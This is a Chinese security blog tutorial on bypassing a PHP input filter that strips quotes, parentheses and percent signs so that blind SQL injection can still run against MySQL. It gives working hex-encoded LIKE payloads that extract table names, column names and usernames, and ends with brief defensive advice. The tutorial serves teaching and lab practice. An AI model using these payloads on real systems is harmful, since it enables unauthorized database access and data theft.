---
title: 常规特殊字符被过滤的一种绕过技巧
url: https://www.secpulse.com/archives/193764.html
source: 安全脉搏
date: 2022-12-20
fetch_date: 2025-10-04T01:56:51.314995
---

# 常规特殊字符被过滤的一种绕过技巧

[![](https://www.secpulse.com/wp-content/themes/secpulse2017/img/logo-header.png)](https://www.secpulse.com "安全脉搏")

* [首页](https://www.secpulse.com/)
* [分类阅读](https://www.secpulse.com/archives/category/category)

  #### 脉搏文库

  - [内网渗透](https://www.secpulse.com/archives/category/articles/intranet-penetration)
  - |
  - [代码审计](https://www.secpulse.com/archives/category/articles/code-audit)
  - |
  - [安全文献](https://www.secpulse.com/archives/category/articles/sec-doc)
  - |
  - [Web安全](https://www.secpulse.com/archives/category/articles/web)
  - |
  - [移动安全](https://www.secpulse.com/archives/category/articles/mobile-security)
  - |
  - [系统安全](https://www.secpulse.com/archives/category/articles/system)
  - |
  - [工控安全](https://www.secpulse.com/archives/category/articles/industrial-safety)
  - |
  - [CTF](https://www.secpulse.com/archives/category/exclusive/ctf-writeup)
  - |
  - [IOT安全](https://www.secpulse.com/archives/category/iot-security)
  - |

#### 安全建设

+ [业务安全](https://www.secpulse.com/archives/category/construction/businesssecurity)
+ |
+ [安全管理](https://www.secpulse.com/archives/category/construction/securityissue)
+ |
+ [数据分析](https://www.secpulse.com/archives/category/construction/bigdata)
+ |

#### 其他

+ [资讯](https://www.secpulse.com/archives/category/news)
+ |
+ [漏洞](https://www.secpulse.com/archives/category/vul)
+ |
+ [工具](https://www.secpulse.com/archives/category/tools)
+ |
+ [人物志](https://www.secpulse.com/archives/category/people)
+ |
+ [区块链安全](https://www.secpulse.com/archives/category/exclusive/block_chain_security)
+ |
+ [安全招聘](https://www.secpulse.com/archives/category/hiring)
+ |

- [安全问答](https://www.secpulse.com/newpage/question_list)
- [金币商城](https://www.secpulse.com/shop?donotcachepage=c010349fd98847cb9d6e07d3cbc19288)
- [安全招聘](https://www.secpulse.com/archives/category/hiring)
- [活动日程](https://www.secpulse.com/newpage/activity)
- [live课程](https://www.secpulse.com/live)
- [企业服务](https://duoyinsu.com/service.html)
- [插件社区](https://x.secpulse.com/)

小程序

![脉搏小程序](https://www.secpulse.com/wp-content/themes/secpulse2017/img/wxchat.jpg)
[登录](https://www.secpulse.com/user_login)
|
[注册](https://www.secpulse.com/user-register)

# 常规特殊字符被过滤的一种绕过技巧

[脉搏文库](https://www.secpulse.com/archives/category/category/secdocs)

[蚁景网安实验室](https://www.secpulse.com/newpage/author?author_id=37244)
![]( https://www.secpulse.com/wp-content/themes/secpulse2017/img/renzheng2.png)

2022-12-19

8,180

**以下文章来源于信安之路 ，作者Mannu Linux**

今天来分享一个绕过过滤比如 `' " ( ) %` 等字符的场景，测试环境为 PHP+Mysql

# 假设场景

php 代码通过 HTTP GET 参数 param1 接收用户输入的内容，然后经过自定义的过滤函数 `input-filter` 过滤可能导致 SQL 注入的特殊字符。

在 SQL 查询中，用户数据（$user\_input）作为列名插入到查询语句中，比如：

```
$query = mysqli_query($connection,"SELECT $user_input,time FROM stats WHERE depth = '$depth' ORDER BY times ASC");
```

应用程序代码执行 SQL 语句后，不会在页面上输出任何内容，那么就无法使用联合查询的技术来获取数据，而代码中也未使用 `mysqli_error()` 函数来打印错误信息，那么也无法使用报错注入的方式来回显数据。

唯一可以利用的技术就只有盲注了，而当前环境的代码中对常见的特殊字符进行了过滤，过滤列表如下：

```
" < > = ' ( ) &  @ % #  ;
```

当我们使用机遇布尔盲注的有效载荷时，比如：

```
from dual where true and 1< ascii ( substring ( database (),1,1 ) )
```

经过函数过滤后，变成了：

```
from dual where true and 1  ascii substring database ,1,1
```

`<、(、)` 被过滤了

假如我们使用 URL 编码特殊字符，但是，URL 编码中都包含特殊字符 `%`，也是被过滤了的，比如：

```
from dual where true and 1 %3C ascii %28 substring %28 database %28 %29 %2C 1 %2C 1 %29%29
```

过滤后变成了：

```
from dual where true and 1 3C ascii 28 substring 28 database 28 29 2C 1 2C 1 2929
```

# 尝试绕过

## 基础

在这种情况下，我们利用漏洞的方式是盲注，为了避免过滤特殊字符，结合 where 条件，使用带有十六进制表示的 `like`子句。

like 子句不仅接受单引号中的输入内容，还支持十六进制的内容：

```
Text         Hex encoded value
%user%         257573657225
```

比如：

```
select column_name from table_name where value_in_column like '%user%'
```

使用十六进制编码的语句：

```
 select column_name from table_name where value_in_column like 0x257573657225
```

## 测试

### 提取表名

假如我们有个表名为 `auth`，使用 like 子句来查找该表名的第一个字符 `a` 的有效载荷：

```
select table_name from information_schema.tables where table_name like 'a%' limit 0,1
```

使用十六进制编码的 payload：

```
select table_name from information_schema.tables where table_name like 0x6125 limit 0,1
```

在上面的案例中，用户输入的 payload 为：

```
table_name from information_schema.tables where table_name like 0x6125 limit 0,1-- -
```

后端执行的完整 SQL 语句为：

```
select table_name from information_schema.tables where table_name like 0x6125 limit 0,1-- - ,time FROM stats WHERE AND depth = '$depth' ORDER BY times ASC
```

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-193764-1671432538.png)

### 提取列名

假设表 `auth` 中有一个列名为 `username`，通常情况下的查询语句为：

```
select column_name from information_schema.columns where table_name like 'auth' and column_name like 'u%' limit 0,1
```

采用十六进制编码后的语句为：

```
select column_name from information_schema.columns where table_name like 0x61757468 and column_name like 0x7525 limit 0,1
```

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-193764-1671432539.png)

### 提取数据

到目前来说已知表名 `auth`，列名 `username`，接下来利用 `like` 查询首字母为 `a` 的数据：

```
select username from auth where username like 'a%' limit 0,1
```

同样使用十六进制编码：

```
select username from auth where username like 0x6125 limit 0,1
```

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-193764-1671432540.png)

# 总结

虽然常规特殊字符被过滤了，利用起来比较复杂，但还是有一条路可以走，对于这部分绕过方式的防御，可以在过滤的关键词中再增加一些，比如 `select、like` 等查询关键词，还有常见的注释符，比如 `-、#、/*` 等。

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-193764-1671432541.gif)

靶场实操，戳“阅读原文“

**本文作者：[蚁景网安实验室](newpage/author?author_id=37244)**

**本文为安全脉搏专栏作者发布，转载请注明：**[**https://www.secpulse.com/archives/193764.html**](https://www.secpulse.com/archives/193764.html)

Tags: [Mysql](https://www.secpulse.com/archives/tag/Mysql)、[php 代码](https://www.secpulse.com/archives/tag/php-%E4%BB%A3%E7%A0%81)、[常规特殊字符](https://www.secpulse.com/archives/tag/%E5%B8%B8%E8%A7%84%E7%89%B9%E6%AE%8A%E5%AD%97%E7%AC%A6)、[绕过技巧](https://www.secpulse.com/archives/tag/%E7%BB%95%E8%BF%87%E6%8A%80%E5%B7%A7)

点赞：
9
[评论：0](#goComment)
收藏：
0

*新浪微博
QQ空间
微信扫一扫*

### 相关文章

* [![神器！MySQL蜜罐服务GUI利用工具](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/2023/06/1686624388925-300x164.png)

  神器！MySQL蜜罐服务GUI利用工具](https://www.secpulse.com/archives/201773.html "详细阅读 神器！MySQL蜜罐服务GUI利用工具")
* [![某oa 11.10 未授权任意文件上传](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-201450-1686040662-300x248.png)

  某oa 11.10 未授权任意文件上传](https://www.secpulse.com/archives/201450.html "详细阅读 某oa 11.10 未授权任意文件上传")
* [![MySQL数据库安全测试](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/2023/05/1684133717094-300x188.png)

  MySQL数据库安全测试](https://www.secpulse.com/archives/200243.html "详细阅读 MySQL数据库安全测试")

评论  (0)

昵称

必填
您当前尚未登录。
[登录？](https://www.secpulse.com/user_login "登录")
[注册](https://www.secpulse.com/user-register)

邮箱

必填（保密）

快来写下你的想法吧！

upload

|  |  |  |
| --- | --- | --- |
| [![]( https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/2024/12/logo-white.png)](https://www.secpulse.com/newpage/author?author_id=37244aaa) | [蚁景网安实验室 ![]( https://www.secpulse.com/wp-content/themes/secpulse2017/img/renzheng2.png)](https://www.secpulse.com/newpage/author?author_id=37244) | |
| 文章数：402 | 积分： 877 |
| 蚁景网安实验室（www.yijinglab.com）网络安全靶场练习平台，涉及CTF赛前指导、职业技能训练、网安专项技能提升等。 | |

* [![阿波罗主机安全管理](/wp-content/themes/secpulse2017/img/product-agent.png)](https://linkage.duoyinsu.com)
* [![伏特漏洞扫描云平台](/wp-content/themes/secpulse2017/img/product-fute.png)](https://v.duoyinsu.com)

### 安全问答社区

![安全问答社区](https://www.secpulse.com/wp-content/themes/secpulse2017/img/xcx.png)

### 脉搏官方公众号

![脉搏公众号](https://www.secpulse.com/wp-content/themes/secpulse2017/img/SecPulse.png)

### 活动日程

[显示更多](https://www.secpulse.com/newpage/activity)

#### 2022-06-17

[Gdevops 全球敏捷运维峰会](https://www.bagevent.com/event/8022600?bag_track=AQMB)

#### 2022-05-12

[Mastering the Challenge！——来自The 3rd AutoCS 2022智能汽车信息安全大会的邀请函](https://autocs2022.a...